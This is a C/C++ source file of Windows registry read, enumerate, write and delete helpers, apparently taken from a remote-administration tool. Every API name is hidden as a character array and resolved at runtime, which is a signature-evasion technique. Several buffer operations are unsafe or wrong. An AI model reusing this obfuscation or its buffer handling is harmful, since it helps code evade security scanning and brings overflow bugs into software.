//#include <windows.h>
#include <afxwin.h>
#include "../Declare.h"   //动态调用库函数

//strchr函数源码
//////////////////////////////////////////////////////////////////////////////////////////////////
char * my_strchr11(const char *str, int ch)
{
   while (*str && *str != (char)ch)
        str++;
   if (*str == (char)ch)
        return((char *)str);
   return(NULL);
}

//源码strnicmp
/////////////////////////////////////////////////////////////////////////////
int my_strnicmp1(const char *dst,const char *src,int count)
{
   int ch1, ch2;
   do
   {
      if ( ((ch1 = (unsigned char)(*(dst++))) >= 'A') &&(ch1 <= 'Z') )
        ch1 += 0x20;
      if ( ((ch2 = (unsigned char)(*(src++))) >= 'A') &&(ch2 <= 'Z') )
        ch2 += 0x20;
   } while ( --count && ch1 && (ch1 == ch2) );
   return (ch1 - ch2);
}

//去除字符串类型前面的空格
char *DelSpace(char *szData)
{
	int i=0 ;
	while(1)
	{
		if(my_strnicmp1(szData+i," ",1))
			break;
		i++;			
	}
	return (szData+i);
} 
/*
//设置注册表键读取的权限(KEY_READ||KEY_WRITE||KEY_ALL_ACCESS)
int SetKeySecurityEx(HKEY MainKey,LPCTSTR SubKey,DWORD security) 
{    
   HKEY  hKey; 
   SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY; 
   PSID pSystemSid              = NULL; 
   PSID pUserSid                = NULL; 
   SECURITY_DESCRIPTOR sd; 
   PACL    pDacl                = NULL; 
   DWORD   dwAclSize; 
   int     iResult              = 0;
	char JwFNw02[] = {'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0'};
    GetProcessHeapT pGetProcessHeap=(GetProcessHeapT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw02);
	char JwFNw03[] = {'H','e','a','p','A','l','l','o','c','\0'};
	HeapAllocT pHeapAlloc=(HeapAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw03);
   __try
   {  
	   char HrFvD07[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
       RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);

	   if(pRegOpenKeyExA(MainKey, SubKey, 0, WRITE_DAC, &hKey)!= ERROR_SUCCESS) 
		   __leave; 
       if(!AllocateAndInitializeSid(&sia,1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid )) 
           __leave;
       if(!AllocateAndInitializeSid( &sia, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,0, 0, 0, 0, 0, 0, &pUserSid))  
           __leave; 
       dwAclSize = sizeof(ACL) + 2 * ( sizeof(ACCESS_ALLOWED_ACE) - sizeof(DWORD) ) + GetLengthSid(pSystemSid) + GetLengthSid(pUserSid) ; 
       pDacl = (PACL)pHeapAlloc(pGetProcessHeap(), 0, dwAclSize); 
       if(pDacl == NULL) 
		   __leave; 
       if(!InitializeAcl(pDacl, dwAclSize, ACL_REVISION)) 
           __leave; 
       if(!AddAccessAllowedAce( pDacl, ACL_REVISION, KEY_ALL_ACCESS, pSystemSid )) 
           __leave; 
       if(!AddAccessAllowedAce( pDacl, ACL_REVISION, (unsigned long)security, pUserSid )) 
           __leave; 
       if(!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) 
           __leave; 
       if(!SetSecurityDescriptorDacl(&sd, TRUE, pDacl, FALSE)) 
           __leave; 
       if(RegSetKeySecurity(hKey, (SECURITY_INFORMATION)DACL_SECURITY_INFORMATION, &sd)!= ERROR_SUCCESS)
		   __leave;
	   iResult =1;
   }
   __finally
   {  
	   char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	   RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	   char JwFNw05[] = {'H','e','a','p','F','r','e','e','\0'};
	   HeapFreeT pHeapFree=(HeapFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JwFNw05);
	   pRegCloseKey(MainKey); 
	   pRegCloseKey(hKey); 
	   
	   if(pDacl !=NULL)         
		   pHeapFree(pGetProcessHeap(), 0, pDacl);  
       if(pSystemSid !=NULL)
	       FreeSid(pSystemSid);
	   if(pUserSid !=NULL)
           FreeSid(pUserSid); 
   }

   return iResult;
}
*/
//读取注册表的指定键的数据(Mode:0-读键值数据 1-牧举子键 2-牧举指定键项 3-判断该键是否存在)
int  ReadRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char *szData,LPBYTE szBytes,DWORD lbSize,int Mode)
{   
	HKEY   hKey;  
	int    ValueDWORD,iResult=0;
	char*  PointStr;  
	char   KeyName[32],ValueSz[MAX_PATH],ValueTemp[MAX_PATH];	
	DWORD  szSize,KnSize,dwIndex=0;	 

	memset(KeyName,0,sizeof(KeyName));
	memset(ValueSz,0,sizeof(ValueSz));
	memset(ValueTemp,0,sizeof(ValueTemp));
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	__try
	{
	//	 SetKeySecurityEx(MainKey,SubKey,KEY_ALL_ACCESS);
		char HrFvD07[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
        RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
		char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
		RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD13);

		char HrFvD15[] = {'R','e','g','E','n','u','m','K','e','y','E','x','A','\0'};
		RegEnumKeyExAT pRegEnumKeyExA=(RegEnumKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD15);
		if(pRegOpenKeyExA(MainKey,SubKey,0,KEY_READ,&hKey) != ERROR_SUCCESS)
		{
            iResult = -1;
			__leave;
		}
		switch(Mode)		 
		{
		case 0:
			switch(Type)
			{
			case REG_SZ:
			case REG_EXPAND_SZ:				 
				szSize = sizeof(ValueSz);
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					strcpy(szData,DelSpace(ValueSz));
					iResult =1;
				}
				break;
			case REG_MULTI_SZ:	
				szSize = sizeof(ValueSz);
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,(LPBYTE)ValueSz,&szSize) == ERROR_SUCCESS)
				{
					for(PointStr = ValueSz; *PointStr; PointStr = my_strchr11(PointStr,0)+1)
					{
					
						strncat(ValueTemp,PointStr,sizeof(ValueTemp));
					    strncat(ValueTemp," ",sizeof(ValueTemp));
					}
					strcpy(szData,ValueTemp);
					iResult =1;
				}
				break;				 			
			case REG_DWORD:
				szSize = sizeof(DWORD);
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,(LPBYTE)&ValueDWORD,&szSize ) == ERROR_SUCCESS)						
				{
					pwsprintfA(szData,"%d",ValueDWORD);
					iResult =1;
				}
				break;
            case REG_BINARY:
                szSize = lbSize;
				if(pRegQueryValueExA(hKey,Vname,NULL,&Type,szBytes,&szSize) == ERROR_SUCCESS)
					iResult =1;
				break;
			}
			break;
		case 1:
			while(1)
			{				 
				memset(ValueSz,0,sizeof(ValueSz));
				szSize   = sizeof(ValueSz);
                if(pRegEnumKeyExA(hKey,dwIndex++,ValueSz,&szSize,NULL,NULL,NULL,NULL) != ERROR_SUCCESS)
					break;
                pwsprintfA(ValueTemp,"[%s]\r\n",ValueSz);
				strcat(szData,ValueTemp);
				iResult =1;
			}			 
			break;
		case 2:			  
			while(1)
			{				 
				memset(KeyName,0,sizeof(KeyName));
				memset(ValueSz,0,sizeof(ValueSz));
				memset(ValueTemp,0,sizeof(ValueTemp));
				KnSize = sizeof(KeyName);
                szSize = sizeof(ValueSz);
				char sIQkS01[] = {'%','-','2','4','s',' ','%','-','1','5','s',' ','%','s',' ','\r','\n','\0'};
				char sIQkS08[] = {'%','-','2','4','s',' ','%','-','1','5','s',' ','0','x','%','x','(','%','d',')',' ','\r','\n','\0'};
				char sIQkS09[] = {'%','-','2','4','s',' ','%','-','1','5','s',' ','\r','\n','\0'};

				char VnUDS01[] = {'R','e','g','E','n','u','m','V','a','l','u','e','A','\0'};
				RegEnumValueAT pRegEnumValueA=(RegEnumValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS01);
                if(pRegEnumValueA(hKey,dwIndex++,KeyName,&KnSize,NULL,&Type,(LPBYTE)ValueSz,&szSize) != ERROR_SUCCESS)
					break;
				switch(Type)				 				
				{				     
				case REG_SZ:					 						 
					pwsprintfA(ValueTemp,sIQkS01,KeyName,"REG_SZ",ValueSz);					     
					break;
				case REG_EXPAND_SZ:                   						 
					pwsprintfA(ValueTemp,sIQkS01,KeyName,"REG_EXPAND_SZ",ValueSz);
					break;
				case REG_DWORD:
					pwsprintfA(ValueTemp,sIQkS08,KeyName,"REG_DWORD",ValueSz,int(ValueSz));
					break;
				case REG_MULTI_SZ:
                    pwsprintfA(ValueTemp,sIQkS09,KeyName,"REG_MULTI_SZ");
					break;
			    case REG_BINARY:
					pwsprintfA(ValueTemp,sIQkS09,KeyName,"REG_BINARY");
					break;
				}
				plstrcatA(szData,ValueTemp);
				iResult =1;
			}
			break;
		case 3:
            iResult =1;
			break;
		}
	}
	__finally
	{
		char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	    RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
        pRegCloseKey(MainKey);
		pRegCloseKey(hKey);
	}
     
	return iResult;
}
//写注册表的指定键的数据(Mode:0-新建键数据 1-设置键数据 2-删除指定键 3-删除指定键项)
int WriteRegEx(HKEY MainKey,LPCTSTR SubKey,LPCTSTR Vname,DWORD Type,char* szData,DWORD dwData,int Mode)
{
	HKEY  hKey; 
	DWORD dwDisposition;    
	int   iResult =0;
	
	__try
	{	
	//	SetKeySecurityEx(MainKey,Subkey,KEY_ALL_ACCESS);
		char HrFvD07[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
        RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
		char HrFvD12[] = {'R','e','g','S','e','t','V','a','l','u','e','E','x','A','\0'};
		RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD12);
		char HrFvD16[] = {'R','e','g','C','r','e','a','t','e','K','e','y','E','x','A','\0'};
		RegCreateKeyExAT pRegCreateKeyExA=(RegCreateKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD16);
		char VnUDS02[] = {'R','e','g','D','e','l','e','t','e','K','e','y','A','\0'};
		RegDeleteKeyAT pRegDeleteKeyA=(RegDeleteKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS02);
		char VnUDS03[] = {'R','e','g','D','e','l','e','t','e','V','a','l','u','e','A','\0'};
		RegDeleteValueAT pRegDeleteValueA=(RegDeleteValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),VnUDS03);
		switch(Mode)		
		{			
		case 0:
			if(pRegCreateKeyExA(MainKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,&dwDisposition) != ERROR_SUCCESS)
				__leave;		 
		case 1:	
			if(pRegOpenKeyExA(MainKey,SubKey,0,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)					 
				__leave;		 		 			 
			switch(Type)
			{		 
			case REG_SZ:		 
			case REG_EXPAND_SZ:			 			 
				if(pRegSetValueExA(hKey,Vname,0,Type,(LPBYTE)szData,strlen(szData)+1) == ERROR_SUCCESS) 				 
					iResult =1;				 			
				break;
		    case REG_DWORD:
                if(pRegSetValueExA(hKey,Vname,0,Type,(LPBYTE)&dwData,sizeof(DWORD)) == ERROR_SUCCESS)  
		            iResult =1;				 			 
			    break;
		    case REG_BINARY:
			    break;
			}
			break;				
		case 2:
            if(pRegOpenKeyExA(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (pRegDeleteKeyA(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;		
		case 3:
            if(pRegOpenKeyExA(MainKey,SubKey,NULL,KEY_READ|KEY_WRITE,&hKey) != ERROR_SUCCESS)				
				__leave;                
			if (pRegDeleteValueA(hKey,Vname) == ERROR_SUCCESS)		        
				iResult =1;
			break;
		}
	}
	__finally 
	{
	    char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	    RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	    pRegCloseKey(MainKey);		
	    pRegCloseKey(hKey);
	}
	return iResult;
}